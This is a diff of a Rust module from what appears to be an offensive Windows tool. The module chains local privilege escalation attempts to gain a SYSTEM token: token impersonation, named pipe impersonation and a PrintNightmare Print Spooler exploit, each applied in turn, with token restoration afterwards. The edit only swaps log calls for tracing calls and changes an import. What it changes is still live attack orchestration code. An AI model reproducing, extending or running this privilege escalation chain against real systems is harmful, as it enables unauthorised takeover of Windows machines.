@@ -32,7 +32,7 @@ pub mod print_spooler;
 pub mod token_impersonate;
 
 use anyhow::{anyhow, Context, Result};
-use winapi::um::winnt::HANDLE;
+use crate::win_types::HANDLE;
 
 // ── Result types ───────────────────────────────────────────────────────────
 
@@ -172,20 +172,20 @@ unsafe fn apply_token(token: HANDLE) -> Result<()> {
 /// }
 /// ```
 pub fn try_all_lpe_methods() -> Result<LpeResult> {
-    log::info!("lpe: attempting local privilege escalation");
+    tracing::info!("lpe: attempting local privilege escalation");
 
     // Capture the current token for potential restoration.
     let original_token = unsafe { capture_current_token() };
 
     // ── Method 1: Token impersonation ──────────────────────────────────
-    log::info!("lpe: trying token impersonation");
+    tracing::info!("lpe: trying token impersonation");
     match token_impersonate::exploit_token_impersonation() {
         Ok(system_token) => {
-            log::info!("lpe: token impersonation succeeded");
+            tracing::info!("lpe: token impersonation succeeded");
 
             // Apply the SYSTEM token.
             if let Err(e) = unsafe { apply_token(system_token) } {
-                log::error!("lpe: failed to apply token: {e:#}");
+                tracing::error!("lpe: failed to apply token: {e:#}");
                 nt_close_handle(system_token as u64);
             } else {
                 return Ok(LpeResult::success(
@@ -196,18 +196,18 @@ pub fn try_all_lpe_methods() -> Result<LpeResult> {
             }
         }
         Err(e) => {
-            log::debug!("lpe: token impersonation failed: {e:#}");
+            tracing::debug!("lpe: token impersonation failed: {e:#}");
         }
     }
 
     // ── Method 2: Named pipe impersonation ─────────────────────────────
-    log::info!("lpe: trying named pipe impersonation");
+    tracing::info!("lpe: trying named pipe impersonation");
     match named_pipe_impersonate::exploit_named_pipe_impersonation("", "") {
         Ok(system_token) => {
-            log::info!("lpe: named pipe impersonation succeeded");
+            tracing::info!("lpe: named pipe impersonation succeeded");
 
             if let Err(e) = unsafe { apply_token(system_token) } {
-                log::error!("lpe: failed to apply token: {e:#}");
+                tracing::error!("lpe: failed to apply token: {e:#}");
                 nt_close_handle(system_token as u64);
             } else {
                 return Ok(LpeResult::success(
@@ -218,18 +218,18 @@ pub fn try_all_lpe_methods() -> Result<LpeResult> {
             }
         }
         Err(e) => {
-            log::debug!("lpe: named pipe impersonation failed: {e:#}");
+            tracing::debug!("lpe: named pipe impersonation failed: {e:#}");
         }
     }
 
     // ── Method 3: Print Spooler exploitation ───────────────────────────
-    log::info!("lpe: trying Print Spooler exploitation");
+    tracing::info!("lpe: trying Print Spooler exploitation");
     match print_spooler::exploit_printnightmare(None) {
         Ok(system_token) => {
-            log::info!("lpe: Print Spooler exploitation succeeded");
+            tracing::info!("lpe: Print Spooler exploitation succeeded");
 
             if let Err(e) = unsafe { apply_token(system_token) } {
-                log::error!("lpe: failed to apply token: {e:#}");
+                tracing::error!("lpe: failed to apply token: {e:#}");
                 nt_close_handle(system_token as u64);
             } else {
                 return Ok(LpeResult::success(
@@ -240,14 +240,14 @@ pub fn try_all_lpe_methods() -> Result<LpeResult> {
             }
         }
         Err(e) => {
-            log::debug!("lpe: Print Spooler exploitation failed: {e:#}");
+            tracing::debug!("lpe: Print Spooler exploitation failed: {e:#}");
         }
     }
 
     // Clean up the captured original token if we didn't use it.
     nt_close_handle(original_token as u64);
 
-    log::warn!("lpe: all privilege escalation methods failed");
+    tracing::warn!("lpe: all privilege escalation methods failed");
     Err(anyhow!(
         "all LPE methods failed (token_impersonation, named_pipe_impersonation, print_spooler)"
     ))
@@ -312,7 +312,7 @@ pub fn restore_token(result: &LpeResult) -> Result<()> {
     // Close the SYSTEM token.
     nt_close_handle(result.system_token as u64);
 
-    log::info!("lpe: restored original security context");
+    tracing::info!("lpe: restored original security context");
     Ok(())
 }
 
